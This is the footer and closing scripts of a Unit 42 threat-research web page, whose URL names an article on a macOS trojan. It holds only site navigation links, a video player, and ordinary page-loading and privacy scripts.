																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-data-loss-prevention"   role="link" title="Data Loss Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention">Data Loss Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-iot-security"   role="link" title="IoT Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security">IoT Security</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall"   role="link" title="Next-Generation Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls">Next-Generation Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall-hardware"   role="link" title="Hardware Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls">Hardware Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/strata-cloud-manager"   role="link" title="Strata Cloud Manager" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager">Strata Cloud Manager</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/sase"   role="link" title="SECURE ACCESS SERVICE EDGE" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE">SECURE ACCESS SERVICE EDGE</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/access"   role="link" title="Prisma Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access">Prisma Access</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/sd-wan"   role="link" title="Prisma SD-WAN" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN">Prisma SD-WAN</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/adem"   role="link" title="Autonomous Digital Experience Management" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management">Autonomous Digital Experience Management</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/next-gen-casb"   role="link" title="Cloud Access Security Broker" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker">Cloud Access Security Broker</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/ztna"   role="link" title="Zero Trust Network Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker:Zero Trust Network Access">Zero Trust Network Access</a>
						</li>    
					        
					</ul>
				</nav>
						         
            </div>
            <div class="nav-column">
                          													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/cortex/cloud"   role="link" title="Cloud Security" data-page-track="true" data-page-track-value="footer:Products and services:Cloud Security">Cloud Security</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cloud"   role="link" title="Cortex Cloud" data-page-track="true" data-page-track-value="footer:Products and services:Cloud Security:Cortex Cloud">Cortex Cloud</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/prisma/cloud"   role="link" title="Prisma Cloud" data-page-track="true" data-page-track-value="footer:Products and services:Cloud Security:Cortex Cloud:Prisma Cloud">Prisma Cloud</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/cortex" target=_blank  role="link" title="AI-Driven Security Operations Platform" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform">AI-Driven Security Operations Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xdr"   role="link" title="Cortex XDR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR">Cortex XDR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsoar"   role="link" title="Cortex XSOAR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR">Cortex XSOAR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse"   role="link" title="Cortex Xpanse" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse">Cortex Xpanse</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsiam"   role="link" title="Cortex XSIAM" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM">Cortex XSIAM</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse/attack-surface-management"   role="link" title="External Attack Surface Protection" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection">External Attack Surface Protection</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/security-operations-automation"   role="link" title="Security Automation" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation">Security Automation</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/detection-and-response"   role="link" title="Threat Prevention, Detection &amp; Response" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation:Threat Prevention, Detection &amp; Response">Threat Prevention, Detection &amp; Response</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/unit42"   role="link" title="Threat Intel and Incident Response Services" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services">Threat Intel and Incident Response Services</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/assess"   role="link" title="Proactive Assessments" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments">Proactive Assessments</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/respond"   role="link" title="Incident Response" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response">Incident Response</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/transform"   role="link" title="Transform Your Security Strategy" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy">Transform Your Security Strategy</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/threat-intelligence-partners"   role="link" title="Discover Threat Intelligence" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy:Discover Threat Intelligence">Discover Threat Intelligence</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Company</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us"   role="link" title="About Us" data-page-track="true" data-page-track-value="footer:Company:About Us">About Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://jobs.paloaltonetworks.com/en/"   role="link" title="Careers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers">Careers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/contact-sales"   role="link" title="Contact Us" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us">Contact Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/corporate-responsibility"   role="link" title="Corporate Responsibility" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility">Corporate Responsibility</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/customers"   role="link" title="Customers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers">Customers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://investors.paloaltonetworks.com/" target=_blank  role="link" title="Investor Relations" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations">Investor Relations</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/locations"   role="link" title="Location" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location">Location</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/newsroom"   role="link" title="Newsroom" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location:Newsroom">Newsroom</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Popular links</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/blog/"   role="link" title="Blog" data-page-track="true" data-page-track-value="footer:Popular links:Blog">Blog</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/communities"   role="link" title="Communities" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities">Communities</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/resources"   role="link" title="Content Library" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library">Content Library</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cyberpedia"   role="link" title="Cyberpedia" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia">Cyberpedia</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://events.paloaltonetworks.com/"   role="link" title="Event Center" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center">Event Center</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://start.paloaltonetworks.com/preference-center"   role="link" title="Manage Email Preferences" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences">Manage Email Preferences</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/products/products-a-z"   role="link" title="Products A-Z" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z">Products A-Z</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/legal-notices/trust-center/tech-certs"   role="link" title="Product Certifications" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications">Product Certifications</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/security-disclosure"   role="link" title="Report a Vulnerability" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability">Report a Vulnerability</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sitemap"   role="link" title="Sitemap" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap">Sitemap</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://docs.paloaltonetworks.com/"   role="link" title="Tech Docs" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs">Tech Docs</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://unit42.paloaltonetworks.com/"   role="link" title="Unit 42" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42">Unit 42</a>
						</li>    
																	<li class="footer-menu-nav__item do-not-sell-link"> 
							<a href="https://panwedd.exterro.net/portal/dsar.htm?target=panwedd" target=_blank  role="link" title="Do Not Sell or Share My Personal Information" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42:Do Not Sell or Share My Personal Information">Do Not Sell or Share My Personal Information</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="footer-bottom"> 
    <div class="l-container"> 
              <div class="footer-logo">
          <a href="https://www.paloaltonetworks.com/" role="link" title="Footer Nav" data-page-track="true" data-page-track-value="footer:logo:Palo Alto Networks">
            <img width="245" height="46" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/palo-alto-footer-logo.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" />          </a>
        </div>
            <div class="footer-bottom__wrapper"> 
        <div class="footer-bottom-nav">
                                              <nav>
                <ul class="footer-menu-nav__list"> 
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/privacy"   role="link" title="Privacy" data-page-track="true" data-page-track-value="footer:bottom-menu:Privacy">Privacy</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/trust-center"   role="link" title="Trust Center" data-page-track="true" data-page-track-value="footer:bottom-menu:Trust Center">Trust Center</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use"   role="link" title="Terms of Use" data-page-track="true" data-page-track-value="footer:bottom-menu:Terms of Use">Terms of Use</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal"   role="link" title="Documents" data-page-track="true" data-page-track-value="footer:bottom-menu:Documents">Documents</a>
                  </li>    
                        
                </ul>
              </nav>
                                            <br/><span class="copyright">Copyright © 2025 Palo Alto Networks. All Rights Reserved</span>
                  </div>
        <div class="footer-bottom-social"> 
          <ul> 
			<li>
			<a href="https://www.youtube.com/user/paloaltonetworks" target="_blank" role="link" title="YouTube" data-page-track="true" data-page-track-value="footer:social:Youtube">
				<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/youtube-black.svg" alt="YouTube">
			</a>
		</li>
				<li> 
			<a href="https://twitter.com/Unit42_Intel" target="_blank" role="link" title="X" data-page-track="true" data-page-track-value="footer:social::Twitter">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/x-icon-black.svg" alt="Twitter">
			</a>
		</li>
				<li> 
			<a href="https://www.facebook.com/PaloAltoNetworks/" target="_blank" role="link" title="Facebook" data-page-track="true" data-page-track-value="footer:social:Facebook">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/Facebook_Icon.svg" alt="Facebook">
			</a>
		</li>
				<li> 
			<a href="https://www.linkedin.com/company/palo-alto-networks" target="_blank" role="link" title="LinkedIn" data-page-track="true" data-page-track-value="footer:social:LinkedIn">
				<img  class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/LinkedIn_Icon.svg" alt="LinkedIn">
			</a>
		</li>
	                <li> 
			<a href="https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/" role="link" title="Podcast" data-page-track="true" data-page-track-value="footer:social:Podcast">
                            <img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/Podcast.svg" alt="Podcast">
			</a>
		</li>
</ul>          
	<div class="pa language-dropdown">
			<div class="language-dropdown__wrapper"> 
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/globe-icon.svg" alt="Globe icon">
			<span id="selectedLanguage">EN</span>
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"><ul><li class="title">Select your language</li>
					<li class="selected" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:en" href="https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/">USA (ENGLISH)</a>
					</li>
					<li class="non-active" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:ja" href="https://unit42.paloaltonetworks.jp/unit42-sofacys-komplex-os-x-trojan/">JAPAN (日本語)</a>
					</li></ul>        </div>
      </div>
    </div>
  </div>
</footer>
<div class="dd-overlay">
</div>
<!--  Start: video modal -->
<div class="modal video__modal" id="videoModal" tabindex="-1">
        <div class="modal__video-wrapper">
          <button class="modal__play-btn is-minimized is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
          <button class="modal__minimize-btn is-minimized">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
          </button>
          <button class="modal__close"> 
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button">
          </button>
          <video class="modal__video" id="customVideo">
            <source src="" type="video/mp4">Your browser does not support the video tag.
          </video>
          <div class="modal__post-details" tabindex="-1">       
              <h3>Default Heading</h3>
              <a class="l-btn" href="#" title="Right Arrow Icon" role="link" data-page-track="true" data-page-track-value="overview:explore reports:View all reports">Read the article
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow">
              </a>
          </div>
          <div class="modal__video-controls">
            <div class="modal__video-seekbar input__wrapper"><span></span>
              <label class="is-hidden" for="modalSeekBar">Seekbar</label>
              <input class="custom-range" id="modalSeekBar" type="range" min="0" max="100" value="1">
              <p class="modal__remaining-time"></p>
            </div>
            <button class="modal__play-btn is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
            <div class="modal__volume-controls">
              <div class="modal__volume__wrapper">
                <button tabindex="0">
                  <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-volume.svg" alt="Volume">
                </button>
                <div class="modal__volume-seekbar"><span></span>
                  <label class="is-hidden" for="volumeBar">Volume</label>
                  <input class="volume__bar" id="volumeBar" type="range" min="0" max="1" step="0.1" value="0.7">
                </div>
              </div>
              <button class="modal__minimize-btn" id="minimizeBtn">
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
              </button>
            </div>
          </div>
        </div>
      </div><!--  End: video modal -->

    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		var like_nonce = jQuery('#_wpnonce').val();
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type+"&ul_nonce="+like_nonce,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=6.7.1' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/js/script.js?ver=1.0.0" id="unit42-v6-navigation-js"></script>

<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
const observer_lozad = lozad('.lozad, .lozad-background'); // lazy loads elements with default selector as '.lozad'
observer_lozad.observe();

function noSell(event) {
    event.preventDefault();
   if (( typeof OneTrust != 'undefined') &&  (!!OneTrust)) {
       OneTrust.ToggleInfoDisplay();
    }else{
      var href = event.target.getAttribute('href');
        window.open(href, '_blank'); 
    }
}

window.PAN_Clean_Util = {
        isIE: false
};

(function () {
   // INP Util Fix
    function yieldToMain(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
   window.PAN_Clean_Util.yieldToMain = yieldToMain
})();

if(referer == "CloudCortex" || referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
  var Coveo_organizationId = "paloaltonetworksintranet";        
  var techDocsPagePath = "https://docs.paloaltonetworks.com/search.html#hd=All%20Prisma%20Cloud%20Documentation&hq=%40panproductcategory%3D%3D(%22Prisma%20Cloud%22)&sort=relevancy&layout=card&numberOfResults=25";
  var languageFromPath="en_US";
  window.Granite = window.Granite || {};
  Granite.I18n = (function() {
  var self = {};
  self.setLocale = function(locale) { };
  self.get = function(text, snippets, note) {
    var out = "";
    if(text){
      if(text ==="coveo.clear"){
        out = "Clear";
      }else if(text ==="coveo.noresultsfound"){
        out = "No results found for this search term.";
      }
    }
    return out;
  };
  return self
  }());
}

  var main_site_critical_top = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.js';
  var main_site_defered = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/defered.min.js';
  var main_site_criticalTopBase = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopBase.min.js';
  var main_site_criticalTopProductNav = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.js';
window.PAN_MainNavAsyncUrl = maindomain_lang+"/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html";

function loadScript(url, defer){
    var script1 = document.createElement('script');
    script1.setAttribute('type', 'text/javascript');
    script1.setAttribute('src',url);
    if(defer == true){
        script1.setAttribute('defer','defer');
    }
    document.head.appendChild(script1);
}
function loadScript1(url, callback){

    var script = document.createElement("script")
    script.type = "text/javascript";
    if (script.readyState){  //IE
        script.onreadystatechange = function(){
            if (script.readyState == "loaded" || script.readyState == "complete"){
                script.onreadystatechange = null;
                callback();
            }
        };
    } else {  //Others
        script.onload = function(){
            callback();
        };
    }
    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}
if(referer == "CloudCortex" || referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
	if(referer == "Unit"){
    setTimeout(function(){
      loadScript(main_site_criticalTopBase, false);
      loadScript1(main_site_criticalTopProductNav, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
	else{
    setTimeout(function(){
      loadScript1(main_site_critical_top, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
}

$(document).ready(function () {
    setTimeout(function(){
      $('.article-banner .ab__options ul li a').each(function(){
          	$(this).attr('target', "_blank");
      });
    }, 4000);
    
    $( ".do-not-sell-link a" ).on( "click", function( event ) {
        noSell(event);
      });
});
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->

</body>
</html>
